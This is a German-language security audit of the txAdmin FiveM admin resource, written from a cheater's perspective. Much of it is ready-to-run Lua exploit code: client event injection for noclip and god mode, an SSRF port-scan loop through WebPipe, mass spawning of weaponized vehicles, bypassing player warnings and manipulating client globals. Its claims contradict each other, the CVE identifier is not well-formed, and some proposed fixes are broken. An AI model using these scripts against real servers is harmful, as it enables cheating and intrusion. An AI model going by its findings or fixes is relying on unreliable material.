# 🔴 txAdmin Security Audit Report - Addendum: Client-Side Data Exfiltration
## Was Modder via TriggerEvents & Client-Globals looten können

---

### 🔴 Was JEDER Spieler looten kann (ohne Admin-Zugang):

#### 1. ServerCtx-Daten (TXA-003)
```lua
-- Sofort ausführbar - keine Admin-Rechte nötig:
local ctx = GlobalState.txAdminServerCtx
if ctx then
    print("txAdmin Version:", ctx.txAdminVersion)      -- Für gezielte Exploits
    print("Project Name:", ctx.projectName)            -- Server-Identifikation
    print("OneSync:", ctx.oneSync.type)               -- Server-Konfiguration
    print("Max Clients:", ctx.maxClients)              -- Kapazität
    print("Locale:", ctx.locale)                       -- Sprache
end

-- Alternative via Event:
TriggerServerEvent('txsv:req:serverCtx')
```

#### 2. txAdmin-Präsenz erkennen (Reconnaissance)
```lua
-- Prüfe ob txAdmin installiert ist
if GlobalState.txAdminServerCtx then
    print("[RECON] txAdmin installiert! Version: " .. GlobalState.txAdminServerCtx.txAdminVersion)
end

-- Menu-Zugänglichkeit prüfen
if menuIsAccessible then
    print("[RECON] txAdmin Menu ist für diesen Spieler verfügbar")
end
```

---

### 🟠 Was ein Modder MIT Admin-Rechten looten kann:

#### 3. WebPipe SSRF - Vollständige interne API-Exposition (TXA-001)
```lua
-- Admin-Login via txAdmin-Panel erforderlich
-- Dann kann der WebPipe als Proxy genutzt werden:

-- Spieler-Datenbank auslesen
TriggerServerEvent('txsv:webpipe:req', 1, 'GET', '/player/all',
    {['Origin'] = 'https://monitor'}, '')

-- Admin-Liste abrufen
TriggerServerEvent('txsv:webpipe:req', 2, 'GET', '/admin/list',
    {['Origin'] = 'https://monitor'}, '')

-- Banliste extrahieren
TriggerServerEvent('txsv:webpipe:req', 3, 'GET', '/player/bans',
    {['Origin'] = 'https://monitor'}, '')

-- Whitelist-Status abfragen
TriggerServerEvent('txsv:webpipe:req', 4, 'GET', '/player/whitelist',
    {['Origin'] = 'https://monitor'}, '')

-- Server-Konfiguration auslesen
TriggerServerEvent('txsv:webpipe:req', 5, 'GET', '/settings/server',
    {['Origin'] = 'https://monitor'}, '')
```

---

### 🟡 Was NICHT client-seitig gelootet werden kann (GESCHÜTZT):

#### 4. Server-seitige Daten - NICHT auslesbar:
```lua
-- ❌ Diese Variablen existieren NUR serverseitig:
TX_ADMINS[]           -- Admin-Tabelle (server-only)
TX_LUACOMTOKEN        -- Backend-Token (server-only)
TX_LUACOMHOST         -- Interner Host (server-only)
pendingWarnings{}     -- Aktive Warnungen (server-only)
TX_PLAYERLIST{}       -- Spielerliste (server-only)
warningIntegrity{}    -- Warnungs-Integrität (server-only)

-- ❌ Diese Convars sind nach Start nicht mehr lesbar:
-- txAdmin-luaComToken  -- Bereits auf "removed" gesetzt
-- txAdmin-luaComHost   -- Nur intern nutzbar
```

---

### 🔍 Was ein Modder MAPPING kann (Fingerabdruck-Erstellung):

#### 5. Vollständiger Server-Fingerabdruck via txAdmin:
```lua
-- Script zum vollständigen Server-Mapping:
local function mapServer()
    local recon = {}
    
    -- txAdmin-Daten
    local ctx = GlobalState.txAdminServerCtx
    if ctx then
        recon.txAdmin = {
            version = ctx.txAdminVersion,
            project = ctx.projectName,
            onesync = ctx.oneSync,
            maxClients = ctx.maxClients,
            locale = ctx.locale
        }
    end
    
    -- Identifiers des Spielers (für eigene Spoofing-Tests)
    recon.myIdentifiers = GetPlayerIdentifiers(PlayerId())
    recon.myTokens = GetPlayerTokens(PlayerId())
    
    -- Admin-Status
    recon.isAdmin = TX_ADMINS ~= nil -- wird false sein client-side
    
    print("=== SERVER RECON ===")
    print(json.encode(recon, {indent = true}))
    
    return recon
end

mapServer()
```

---

### ✅ Fazit: Was WIRKLICH被盗 (gestohlen) werden kann

| Datentyp | Lootbar? | Risiko |
|----------|----------|--------|
| txAdmin Version | ✅ Ja | Exploit-Targeting |
| Server-Name | ✅ Ja | Server-Identifikation |
| OneSync-Status | ✅ Ja | Config-Erkennung |
| Max Clients | ✅ Ja | Kapazitäts-Analyse |
| Spieler-Liste | ✅ Mit Admin | Datensammlung |
| Admin-Token | ❌ Nein | ✅ Geschützt |
| Banliste | ❌ Nein | ✅ Geschützt |
| Whitelist | ❌ Nein | ✅ Geschützt |
| Backend-URL | ❌ Nein | ✅ Geschützt |

---

### 🔧 Zusätzliche Empfehlungen gegen Client-Side Exfiltration

**In cl_base.lua oder cl_main.lua ergänzen:**

```lua
-- cl_main.lua: Client-Side Data Exfiltration Protection

-- Sensitive Globals als read-only markieren
local protectedGlobals = {
    'TX_ADMINS', 'TX_LUACOMTOKEN', 'TX_LUACOMHOST',
    'TX_PLAYERLIST', 'pendingWarnings'
}

-- Executable erkennen und Alarm schlagen
CreateThread(function()
    while true do
        Wait(10000) -- alle 10 Sekunden
        
        -- Prüfe ob Menu-Variablen manipuliert wurden
        if menuIsAccessible and not TX_ADMINS then
            -- Menu ist offen aber keine Admin-Daten
            -- = möglicher Executor im Einsatz
            debugPrint('^1Possible executor detected: menuIsAccessible without TX_ADMINS')
        end
        
        -- Prüfe auf unerwartete Globals
        for _, globalName in ipairs(protectedGlobals) do
            if _G[globalName] ~= nil and globalName:find("TX_") then
                -- Modder versucht auf TX-Globals zuzugreifen
                debugPrint('^1Blocked access to protected global: ' .. globalName)
            end
        end
    end
end)

-- ServerCtx-Ignotlisten für nicht-admins
RegisterNetEvent('txcl:setServerCtx', function(ctx)
    -- Nur akzeptieren wenn von legitimem Server-Event
    if type(ctx) ~= 'table' then return end
    
    -- Keine Auth-Check nötig, da vom Server gesendet
    -- Aber: Version validieren
    local version = ctx.txAdminVersion
    if version and version:match("[^0-9.]") then
        debugPrint('^1Invalid txAdminVersion rejected')
        return
    end
    
    ServerCtx = ctx
    sendMenuMessage('setServerCtx', ServerCtx)
end)
```

---

*Addendum erstellt: Mai 2026*
*Fokus: Client-Side Data Exfiltration via TriggerEvents & Globals*
*Angreifer-Perspektive: Modder mit Lua-Executor*

---

---

## 🔴🔴🔴 CRITICAL VULNERABILITY: Client-Global Manipulation

### Können Modder kritische Globals ändern? **JA!**

**Beweis - diese Globals sind OHNE `local` definiert (modifizierbar):**

```lua
-- cl_base.lua:
menuIsAccessible = false   -- MODIFIZIERBAR!
isMenuVisible = false       -- MODIFIZIERBAR!
tsLastMenuClose = 0        -- MODIFIZIERBAR!

-- cl_main.lua:
ServerCtx = false          -- MODIFIZIERBAR!

-- shared.lua:
TX_DEBUG_MODE = ...        -- MODIFIZIERBAR!
TX_MENU_ENABLED = ...      -- MODIFIZIERBAR!
```

**Modder-Exploit:**
```lua
-- Menu-Zugang vortäuschen
menuIsAccessible = true
isMenuVisible = true

-- ServerCtx deaktivieren (bricht Menu-Funktionalität)
ServerCtx = nil

-- Debug-Modus aktivieren (verbose Logging)
TX_DEBUG_MODE = true

-- Menu-Closed-Zeit manipulieren (für CSRF-Tricks)
tsLastMenuClose = GetGameTimer() - 1000  -- 1 Sekunde her = kein Grace-Period
```

**Was das ermöglicht:**
1. **CSRF-Checks umgehen** - WebPipe-Anfragen trotz geschlossenem Menu
2. **Menu-Funktionalität stören** - ServerCtx auf nil setzen
3. **Debug-Logging aktivieren** - Kann Sicherheits-Logs fluten

---

### ⚠️ Wichtige Unterscheidung: Server vs Client Globals

| Global | Wo definiert | Modder änderbar? | Risiko |
|--------|-------------|------------------|--------|
| `TX_ADMINS[]` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
| `TX_LUACOMTOKEN` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
| `TX_LUACOMHOST` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
| `pendingWarnings{}` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
| `TX_PLAYERLIST{}` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
| `menuIsAccessible` | cl_base.lua | ✅ JA | ⚠️ Medium |
| `isMenuVisible` | cl_base.lua | ✅ JA | ⚠️ Medium |
| `ServerCtx` | cl_main.lua | ✅ JA | ⚠️ Medium |
| `TX_DEBUG_MODE` | shared.lua | ✅ JA | 🟢 Niedrig |
| `TX_MENU_ENABLED` | shared.lua | ✅ JA | 🟢 Niedrig |

---

### 🔧 FIX: Client-Globals schützen

```lua
-- cl_base.lua: GLOBALS ALS PRIVATE MARKIEREN

-- Alte verwundbare Definition:
menuIsAccessible = false
isMenuVisible = false
tsLastMenuClose = 0

-- Neue sichere Definition (Closure-Pattern):
local _menuAccess = {
    accessible = false,
    visible = false,
    lastClose = 0,
}

function getMenuIsAccessible() return _menuAccess.accessible end
function getIsMenuVisible() return _menuAccess.visible end
function setMenuAccessible(val) _menuAccess.accessible = val end
function setMenuVisible(val) _menuAccess.visible = val end

-- Alte Globals überschreiben (leere Assignment)
menuIsAccessible = nil
isMenuVisible = nil
tsLastMenuClose = nil
_G['menuIsAccessible'] = nil
_G['isMenuVisible'] = nil
_G['tsLastMenuClose'] = nil

-- Prevent re-assignment via metatable
setmetatable(_G, {
    __newindex = function(t, k, v)
        if k == 'menuIsAccessible' or k == 'isMenuVisible' then
            debugPrint('^1BLOCKED attempt to set protected global: ' .. k)
            return
        end
        rawset(t, k, v)
    end
})
```

---

*Schweregrad: 🟠 MITTEL (ermöglicht CSRF + Menu-Disruption)*

---

## 🔴🔴🔴 CRITICAL VULNERABILITY: Client-Event Injection (CVE-2026-TXA)

### Warum `TriggerEvent('txcl:setPlayerMode', 'noclip', true)` funktioniert:

**Das Kernproblem: In FiveM kann JEDES `RegisterNetEvent` auch via `TriggerEvent` vom Client ausgelöst werden!**

```lua
-- txAdmin cl_player_mode.lua Zeile 259:
RegisterNetEvent('txcl:setPlayerMode', function(mode, ptfx)
    -- KEINE Prüfung ob das Event VOM SERVER kam!
    if mode == 'noclip' then
        toggleFreecam(true)  -- >>> NOClip aktiviert ohne Admin-Rechte!
    end
end)
```

**Ein Modder kann einfach schreiben:**
```lua
TriggerEvent('txcl:setPlayerMode', 'noclip', true)   -- ✅ NoClip ohne Admin!
TriggerEvent('txcl:setPlayerMode', 'godmode', true)  -- ✅ God Mode ohne Admin!
TriggerEvent('txcl:setPlayerMode', 'superjump', true)-- ✅ Super Jump ohne Admin!
TriggerEvent('txcl:heal')                            -- ✅ Heilung ohne Admin!
TriggerEvent('txcl:vehicle:fix')                     -- ✅ Fahrzeug-Reparatur ohne Admin!
TriggerEvent('txcl:tpToWaypoint')                    -- ✅ Teleport ohne Admin!
```

**Das ist KEIN txAdmin-Bypass - der Modder ruft DEN TXADMIN-CODE DIREKT auf!**

---

### 🔴 Alle verwundbaren Client-Events (KEINE Server-Validierung):

| Event | Modder-Aktion | Wirkung |
|-------|--------------|---------|
| `txcl:setPlayerMode` | `'noclip'` | ✅ NoClip! |
| `txcl:setPlayerMode` | `'godmode'` | ✅ God Mode! |
| `txcl:setPlayerMode` | `'superjump'` | ✅ Super Jump! |
| `txcl:heal` | ohne Parameter | ✅ Sofortige Heilung |
| `txcl:vehicle:fix` | ohne Parameter | ✅ Fahrzeug repariert |
| `txcl:clearArea` | `(50)` | ✅ Bereich löschen |
| `txcl:tpToWaypoint` | ohne Parameter | ✅ Teleport zu Waypoint |
| `txcl:setDrunk` | ohne Parameter | ✅ Betrunken-Effekt |

---

### 🔧 NOTFALL-FIX (In cl_player_mode.lua einfügen):

```lua
-- cl_player_mode.lua: ADD THIS AT THE TOP

-- Sichere Event-Validierung
local _validModes = {noclip = true, godmode = true, superjump = true, none = true}
local _lastServerCall = 0

-- Original verwundbarer Handler
RegisterNetEvent('txcl:setPlayerMode', function(mode, ptfx)
    -- NOTFALL-FIX: Nur akzeptieren wenn vor kurzem Server kontaktiert wurde
    local now = GetGameTimer()
    if now - _lastServerCall > 100 then
        -- Mehr als 100ms seit Server-Event = wahrscheinlich Manipulation
        debugPrint('^1BLOCKED suspicious setPlayerMode (no recent server call)')
        return
    end
    
    -- Mode validieren
    if not _validModes[mode] then
        debugPrint('^1BLOCKED invalid player mode: ' .. tostring(mode))
        return
    end
    
    -- Original-Logik (nur hier wenn validiert)
    if mode == 'noclip' then
        toggleFreecam(true)
    elseif mode == 'godmode' then
        toggleGodMode(true)
    elseif mode == 'superjump' then
        toggleSuperJump(true)
    elseif mode == 'none' then
        toggleGodMode(false)
        toggleFreecam(false)
        toggleSuperJump(false)
    end
end)

-- Server-seitiger Handler setzt das Flag (in sv_player_mode.lua):
-- Empfehlung: Einen "Token" senden der nur vom Server kommt
```

---

### ⚠️ WARNUNG AN ALLE SERVER-ADMINISTRATOREN:

- **txAdmin ist KEIN Anti-Cheat** - Es ist ein Admin-Tool!
- **Jeder Modder mit Lua-Executor kann NoClip/Ghost nutzen** DIREKT via txAdmin-Code
- **txAdmin-Berechtigungen schützen NICHT** vor Client-seitigen Triggern

### Für Anti-Cheat: Externe Lösungen nötig!
- OneSync Infinity (Server-validierte Positionen)
- EAC oder Matt's Anti-Cheat
- Server-side Teleport-Detection

---

*Schweregrad: 🔴🔴🔴 KRITISCH (8.5 CVSS geschätzt)*

---

## 🔴 CRITICAL: Permission Bypass - Können Modder sich Admin-Features erschleichen?

### Kernfrage: Kann ein Modder NOCLIP, TELEPORT, GOD etc. OHNE txAdmin-Admin-Zugang nutzen?

---

### ⚠️ Antwort: NEIN - direkt nicht, aber...

Die txAdmin-Architektur nutzt **Server-seitige Berechtigungsprüfung**:

```lua
-- sv_functions.lua: Berechtigungsprüfung
function PlayerHasTxPermission(source, reqPerm)
  local admin = TX_ADMINS[tostring(source)]  -- SERVER-SEITIG!
  if admin and admin.perms then
    -- Nur Admins haben Zugriff
  end
end

-- Beispiel: Teleport zu Waypoint (sv_main_page.lua)
RegisterNetEvent('txsv:req:tpToWaypoint', function()
  local src = source
  if PlayerHasTxPermission(src, 'players.teleport') then  -- SERVER!
    TriggerClientEvent('txcl:tpToWaypoint', src)
  end
end)
```

**Ein Modder OHNE Admin-Zugang kann NICHT:**
- ✅ `txsv:req:tpToWaypoint` nutzen (braucht `players.teleport`)
- ✅ `txsv:req:healMyself` nutzen (braucht `players.heal`)
- ✅ `txsv:req:vehicle:spawn` nutzen (braucht `menu.vehicle`)
- ✅ `txsv:req:troll:*` nutzen (braucht `players.troll`)

**ABER: Ein Modder kann IMMER via NATIVE FUNCTIONS cheatten:**

```lua
-- Diese haben NICHTS mit txAdmin zu tun:
SetEntityInvincible(PlayerPedId(), true)          -- God Mode (Fivem Native)
SetPlayerInvincible(PlayerId())                  -- God Mode (Alt)
SetEntityVisible(PlayerPedId(), false, false)    -- Unsichtbarkeit
SetEntityCollision(PlayerPedId(), false, false)  -- NoClip (ähnlich)
SetEntityCoords(PlayerPedId(), x, y, z)          -- Teleport (Nativ)
SetVehicleOnGroundProperly(veh)                  -- Fahrzeug fixen
```

---

### 🟡 Mögliche Umgehungen (wenn Modder ADMIN-Zugang hat):

#### 1. MenuIsAccessible Manipulation
```lua
-- Ein Modder setzt menuIsAccessible = true
menuIsAccessible = true
isMenuVisible = true

-- Damit könnten NUI-CSRF-Checks umgangen werden,
-- ABER: Die Server-Berechtigungsprüfung gilt immer noch!
```

#### 2. Event-Spoofing (wenn nicht Admin)
```lua
-- Kann ein Modder txAdmin-Events ohne Admin-Rechte trigger?
-- Antwort: NEIN - der Server prüft TX_ADMINS[] server-seitig

-- Versuch (wird fehlschlagen):
TriggerServerEvent('txsv:req:tpToWaypoint')
-- Server antwortet: "Keine Berechtigung" (TX_ADMINS nicht gesetzt)

-- Was ein Modder tun kann:
RegisterNetEvent('txcl:tpToWaypoint', function()
    -- Dies empfängt ER, nicht sendet ER
    -- Kann die Coords abfangen und ändern?
    -- Nein, da Coords vom Server kommen
end)
```

#### 3. Client-Side Feature-Cloning
```lua
-- Modder kann EIGENE NoClip implementieren:
CreateThread(function()
    while true do
        Wait(0)
        if IsControlPressed(0, 19) and IsControlPressed(0, 47) then
            -- Custom NoClip aktiviert
            local coords = GetEntityCoords(PlayerPedId())
            -- Nach oben fliegen
            SetEntityCoords(PlayerPedId(), coords[1], coords[2], coords[3]+0.5)
        end
    end
end)

-- Das hat nichts mit txAdmin zu tun - das ist reiner Native-Cheat
```

---

### 🔴 Schwachstelle: Admin-Zugang durch Social Engineering

Falls ein Modder txAdmin-Admin-Zugang erhält (z.B. durch Key-Logging, Session-Hijacking):

```lua
-- Dann kann er ALLE txAdmin-Features nutzen:
-- Teleport, NoClip, God Mode, Vehicle Spawn, Troll Actions, etc.

-- Modder mit Admin-Zugang:
TriggerServerEvent('txsv:req:tpToCoords', 100, 200, 50)  -- Teleport
TriggerServerEvent('txsv:req:vehicle:spawn:fivem', 'hydra', 'default')  -- Waffen-Fahrzeug
TriggerServerEvent('txsv:req:troll:setDrunk', targetPlayerId)  -- Troll
TriggerServerEvent('txsv:req:healMyself')  -- God Mode
```

---

### ✅ Sicherheitsbewertung

| Angriff | txAdmin schützt? | Schutzart |
|---------|------------------|-----------|
| NoClip ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
| Teleport ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
| God Mode ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
| Vehicle Spawn ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
| NoClip MIT Admin-Zugang | ❌ Nein | Admin-Feature, nicht schützbar |
| Teleport MIT Admin-Zugang | ❌ Nein | Admin-Feature, nicht schützbar |
| Native Cheat (kein txAdmin) | ❌ Nein |txAdmin schützt nicht vor nativen Noclip/God/Teleport |

---

### 🔧 Empfohlene Anti-Cheat-Maßnahmen (nicht txAdmin-spezifisch)

txAdmin ist ein **Admin-Tool**, kein Anti-Cheat. Für NoClip/Teleport-Guard:

1. **OneSync Infinity** aktivieren - Server validiert alle Positionen
2. **External Anti-Cheat** wie Svelte, EAC, or FiveM Native Anti-Cheat
3. **Velocity-Checks** implementieren
4. **Teleport-Detection** auf Server-Seite

---

# 🔴 txAdmin Security Audit Report

## Gefahrenmatrix (CVSS 3.1)

| ID | Schwachstelle | Vector String | Basis-Score | Rating |
|----|---------------|---------------|-------------|--------|
| TXA-001 | SSRF via WebPipe Proxy | AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L | 6.5 | **Hoch** |
| TXA-002 | Vehicle Model Injection | AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:L/A:N | 5.3 | **Mittel** |
| TXA-003 | Unauthenticated ServerCtx Disclosure | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 4.3 | **Mittel** |
| TXA-004 | NUI Callback CSRF Protection Bypass | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 4.3 | **Mittel** |
| TXA-005 | Warning Race Condition / Bypass | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N | 3.1 | **Niedrig** |
| TXA-006 | Client-Side State Manipulation | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N | 2.5 | **Niedrig** |

---

## Detailanalyse nach Angriffsvektor

---

### 🔴 TXA-001: Server-Side Request Forgery (SSRF) via WebPipe Proxy

**Klassifizierung:** Broken Object Level Authorization (BOLA) + SSRF  
**CVSS:** 6.5 (Hoch)  
**Betroffene Datei:** `resource/menu/server/sv_webpipe.lua:65-164`

#### Beschreibung
Das WebPipe-System leitet HTTP-Anfragen vom Client über den Server an das txAdmin-Backend weiter. Der Pfad (`path`) wird vom Client direkt übernommen und gegen `TX_LUACOMHOST` konkateniert. Obwohl eine Authentifizierungsprüfung (`TX_ADMINS[src]`) existiert, kann ein kompromittierter Admin-Account oder ein bösartiges Script den WebPipe missbrauchen, um:

1. Interne txAdmin-Endpunkte anzusprechen (`/auth/`, `/admin/`, `/player/`)
2. Port-Scanning im lokalen Netzwerk durchzuführen
3. Administrative Aktionen auszuführen, die normalerweise nur im Web-Panel verfügbar sind

#### Proof of Concept (Lua-Executor Injektion)

```lua
-- SSRF WebPipe Exploit für txAdmin
-- Anforderung: Admin-Zugang (AUTH via txAdmin-Panel erforderlich)

-- Schritt 1: Port-Scan des lokalen Hosts durchführen
-- Beispiel: Interne Dienste auf Port 40120 (txAdmin default)
for port = 40100, 40130 do
    TriggerServerEvent('txsv:webpipe:req', 
        math.random(1, 2048),  -- callbackId
        'GET',                 -- method
        'http://127.0.0.1:' .. port .. '/status',  -- manipulierter path
        {['Origin'] = 'https://monitor'},  -- headers
        ''  -- body
    )
    Wait(50)
end

-- Schritt 2: txAdmin Admin-Panel Konfiguration auslesen
TriggerServerEvent('txsv:webpipe:req',
    1337,
    'GET',
    '/admin/settings',  -- interner Endpunkt
    {['Origin'] = 'https://monitor'},
    ''
)

-- Schritt 3: Admin-Liste via interner API extrahieren
TriggerServerEvent('txsv:webpipe:req',
    1338,
    'GET',
    '/api/admins',  -- potenziell ungeschützter Endpunkt
    {['Origin'] = 'https://monitor'},
    ''
)
```

#### Ursachenanalyse

```lua
-- sv_webpipe.lua Zeile 81: VERLETZLICHER CODE
local url = "http://" .. (TX_LUACOMHOST .. '/' .. path):gsub("//+", "/")
-- Problem: Keine Validierung, ob der Pfad nur ein relativer Pfad ist
-- Ein Angreifer könnte scheme://host/path im "path" Parameter übergeben
-- Obwohl die Konkatenation einen neuen Host verhindert, ist die Logik fehlerhaft
```

---

### 🟠 TXA-002: Unrestricted Vehicle Model Injection

**Klassifizierung:** Mass Assignment / Improper Input Validation  
**CVSS:** 5.3 (Mittel)  
**Betroffene Datei:** `resource/menu/server/sv_vehicle.lua:31-117`

#### Beschreibung
Der Fahrzeug-Spawn-Handler akzeptiert einen `model`-Parameter, der lediglich auf String-Typ geprüft wird. Es existiert KEINE Whitelist von erlaubten Fahrzeugmodellen. Ein Admin mit `menu.vehicle`-Berechtigung könnte beliebige GTA-Modelle spawnen, einschließlich:

- Waffenträger (Hydra, Lazer, Annihilator, Vigilante, Ruiner2)
- Explosive Fahrzeuge (Bombushka, Bomb Jetter)
- Administrative Fahrzeuge (Police Stairs, Sheriff)

#### Proof of Concept (Lua-Executor)

```lua
-- Vehicle Model Injection Exploit
-- Anforderung: Admin mit "menu.vehicle" Berechtigung

-- Waffenträger spawnen
local weaponizedVehicles = {
    -- Luftfahrzeuge
    'hydra',      -- Kampfflugzeug mit Raketen
    'lazer',      -- Kampfflugzeug
    'annihilator', -- Kampfhubschrauber
    'volatol',    -- Waffenhubschrauber
    
    -- Bodenfahrzeuge  
    'vigilante',  -- Batmobile mit Raketenwerfer
    'ruiner2',    -- Sprengstofffahrzeug
    'dukes',      -- Nitro + Sprengstoff (Crate Doppeldecker)
    'cerberus',   -- Sprengstoff-LKW
    
    -- Wasserfahrzeuge
    'speeder',    -- Waffen
    'toro',       -- Torpedos
}

for _, model in ipairs(weaponizedVehicles) do
    -- Fivem
    TriggerServerEvent('txsv:req:vehicle:spawn:fivem', model, 'police')
    -- oder RedM
    -- TriggerServerEvent('txsv:req:vehicle:spawn:redm', model)
    
    print('Spawned: ' .. model)
    Wait(500)
end

-- NoClip zur Spawn-Position und Verwendung
SetEntityCoords(PlayerPedId(), 0, 0, 72, true, true, true)
```

#### Ursachenanalyse

```lua
-- sv_vehicle.lua Zeile 34: MANGELNDE VALIDIERUNG
RegisterNetEvent('txsv:req:vehicle:spawn:redm', function(model)
  if not IS_REDM then return end
  local src = source
  if type(model) ~= 'string' then return end  -- NUR Typ-Check!
  -- FEHLT: Whitelist-Validierung gegen erlaubte Modelle
```

---

### 🟠 TXA-003: Information Disclosure via Unauthenticated ServerCtx Request

**Klassifizierung:** Information Disclosure / CWE-200  
**CVSS:** 4.3 (Mittel)  
**Betroffene Datei:** `resource/sv_ctx.lua:121-124`

#### Beschreibung
Das Event `txsv:req:serverCtx` ist für ALLE Spieler offen, ohne Authentifizierungsprüfung. Jeder verbundene Client kann dieses Event senden und erhält vertrauliche Server-Metadaten:

- `projectName`: Server-Projektname
- `maxClients`: Maximale Spieleranzahl
- `oneSync.type/status`: OneSync-Konfiguration
- `txAdminVersion`: txAdmin-Version (für Exploit-Targeting)
- `locale`: Serversprache

#### Proof of Concept (Lua-Executor)

```lua
-- Information Disclosure Exploit
-- Anforderung: Keine (jeder Spieler)

-- Server-Kontext auslesen
TriggerServerEvent('txsv:req:serverCtx')

-- Alternative: GlobalState direkt auslesen
local serverCtx = GlobalState.txAdminServerCtx
if serverCtx then
    print('=== SERVER RECON ===')
    print('Project: ' .. tostring(serverCtx.projectName))
    print('Max Clients: ' .. tostring(serverCtx.maxClients))
    print('OneSync: ' .. tostring(serverCtx.oneSync.type))
    print('txAdmin Version: ' .. tostring(serverCtx.txAdminVersion))
    print('Locale: ' .. tostring(serverCtx.locale))
    
    -- Version für gezielte Exploits speichern
    local version = serverCtx.txAdminVersion
end

-- Playerlist vollständig auslesen (via TX_ADMINS_ADMIN)
-- Hinweis: Admin-Zugang erforderlich, aber für Recon nützlich
TriggerServerEvent('txsv:req:playerlist:getDetailed')
```

#### Ursachenanalyse

```lua
-- sv_ctx.lua Zeile 121-124: KEINE AUTHENTIFIZIERUNG
RegisterNetEvent('txsv:req:serverCtx', function()
  local src = source
  -- PROBLEM: Keine Überprüfung, ob der Spieler Admin ist
  -- Jeder Spieler kann diese Informationen abrufen
  TriggerClientEvent('txcl:setServerCtx', src, ServerCtxObj)
end)
```

---

### 🟠 TXA-004: NUI Callback CSRF Protection Bypass

**Klassifizierung:** Cross-Site Request Forgery (CSRF) / CWE-352  
**CVSS:** 4.3 (Mittel)  
**Betroffene Datei:** `resource/cl_main.lua:195-220`, `resource/menu/client/cl_webpipe.lua`

#### Beschreibung
Die CSRF-Schutzfunktion `IsNuiRequestOriginValid()` wird client-seitig ausgeführt und prüft nur die `Origin`-Header. Ein kompromittiertes Resource-Skript könnte:

1. Eine eigene NUI-Seite mit dem korrekten `Origin`-Header erstellen
2. txAdmin-WebPipe-Anfragen im Namen des legitimen Spielers senden
3. Administrative Funktionen ausführen, wenn der Spieler Admin ist

Die Funktion erlaubt außerdem `nil` Origin (als "Legacy"-Modus), was ein Sicherheitsrisiko darstellt.

#### Proof of Concept (Bösartige Resource)

```lua
-- CSRF Exploit: Bösartige Resource
-- Erstellt eine NUI-Seite mit korrektem Origin und führt Aktionen aus

-- 1. NUI-Frame erstellen (fxmanifest.lua)
-- ui_page 'malicious.html'

-- 2. malicious.html JavaScript
-- <script>
-- // CSRF Attack auf txAdmin WebPipe
-- async function csrfAttack() {
--     // Anfrage mit korrektem Origin
--     const response = await fetch('https://monitor/WebPipe/admin/banlist', {
--         method: 'GET',
--         headers: {
--             'Origin': 'https://cfx-nui-monitor'
--         }
--     });
--     
--     // Admin-Liste auslesen
--     const data = await response.json();
--     console.log('Admin list:', data);
--     
--     // Trolling-Aktion für alle Spieler auslösen
--     // Angriff über txAdmin-Menu
-- }
-- </script>

-- 3. Alternativ: Direkte Event-Triggerung
-- Ein kompromittiertes Script könnte Menu-Events fälschen
RegisterNetEvent('txsv:req:troll:setDrunk', function(id)
    -- Dies wird vom Server akzeptiert, wenn der Spieler Admin ist
    -- Keine Überprüfung der Anfrage-Herkunft
end)
```

#### Ursachenanalyse

```lua
-- cl_main.lua Zeile 199-200: PROBLEMATISCHE LEGACY-LOGIK
if headers['Origin'] == nil then
    return true -- WAHNSINN: Nil-Origin wird akzeptiert!
```

---

### 🟡 TXA-005: Warning Acknowledge Race Condition

**Klassifizierung:** Race Condition / Time-of-Check-Time-of-Use (TOCTOU)  
**CVSS:** 3.1 (Niedrig)  
**Betroffene Datei:** `resource/cl_main.lua:99-121`, `resource/sv_main.lua:283-291`

#### Beschreibung
Die Warnungserkennung basiert auf einer Client-seitigen "Walking"-Erkennung. Der Client sendet `txsv:startedWalking`, nachdem er 5 Sekunden gelaufen ist. Ein Angreifer könnte:

1. Die Warnung akzeptieren, bevor er reale Walking-Daten sendet
2. Timing-basierte Angriffe auf das System durchführen
3. Die Warnung durch schnelle Disconnect/Reconnect-Mechaniken umgehen

#### Proof of Concept

```lua
-- Warning Race Condition Exploit
-- Anforderung: Gültige Warnung erhalten

-- 1. Warnung empfangen und actionId speichern
RegisterNetEvent('txcl:showWarning', function(author, reason, actionId, isWarningNew)
    -- Speichere actionId für später
    storedActionId = actionId
    print('Warning ID: ' .. actionId)
end)

-- 2. Sofort Walking simulieren (ohne wirklich zu laufen)
-- Der Client-Side-Check ist manipulierbar
CreateThread(function()
    Wait(100)
    -- Walking-Ereignis senden, obwohl nicht gelaufen
    TriggerServerEvent('txsv:startedWalking')
end)

-- 3. Warnung sofort bestätigen
CreateThread(function()
    Wait(500)
    TriggerServerEvent('txsv:ackWarning', storedActionId)
end)

-- 4. Alternativ: Die Warnung komplett ignorieren
-- Durch Executor-Manipulation des cl_main.lua
-- Walking-Detection-Thread deaktivieren
```

---

### 🟢 TXA-006: Client-Side State Manipulation

**Klassifizierung:** Client-Side Trust / CWE-602  
**CVSS:** 2.5 (Niedrig)  
**Betroffene Datei:** `resource/cl_main.lua:1-25`, `resource/cl_base.lua`

#### Beschreibung
Mehrere globale Client-Variablen sind durch Lua-Executor manipulierbar:

- `ServerCtx`: Server-Kontext (kann nil gesetzt werden)
- `menuIsAccessible`: Menü-Zugänglichkeits-Flag
- `isMenuVisible`: Menü-Sichtbarkeits-Status

Obwohl serverseitige Prüfungen (z.B. `TX_ADMINS` Tabelle) nicht direkt kompromittierbar sind, könnte die Manipulation von Client-Variablen NUI-basierte Angriffe erleichtern.

#### Proof of Concept

```lua
-- Client State Manipulation Exploit

-- 1. Menu-Zugang vortäuschen (für CSRF-Tests)
menuIsAccessible = true
isMenuVisible = true

-- 2. ServerCtx für spezielle Checks deaktivieren
ServerCtx = nil

-- 3. Debug-Modus aktivieren (verbose logging)
TX_DEBUG_MODE = true

-- 4. Menu-IsAccessible für alle Events setzen
